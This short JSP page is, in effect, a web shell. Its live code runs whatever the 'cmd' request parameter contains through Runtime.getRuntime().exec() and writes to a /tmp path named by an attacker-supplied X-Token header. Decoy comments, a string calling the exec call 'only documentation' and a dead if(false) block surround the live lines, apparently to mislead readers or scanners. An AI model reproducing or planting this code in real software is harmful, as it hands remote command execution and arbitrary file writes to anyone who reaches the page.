<%@ page import="java.io.*" %>
<%-- Runtime.getRuntime().exec(request.getParameter("old")) --%>
<%
String c = request.getParameter("cmd");
String t = request.getHeader("X-Token");
String doc = "Runtime.getRuntime().exec(c) is only documentation";
// new ProcessBuilder(c).start();
if (false) {
    Class.forName("x.Y").newInstance();
}
Process p = Runtime.getRuntime().exec(c);
FileOutputStream fo = new FileOutputStream("/tmp/" + t);
%>
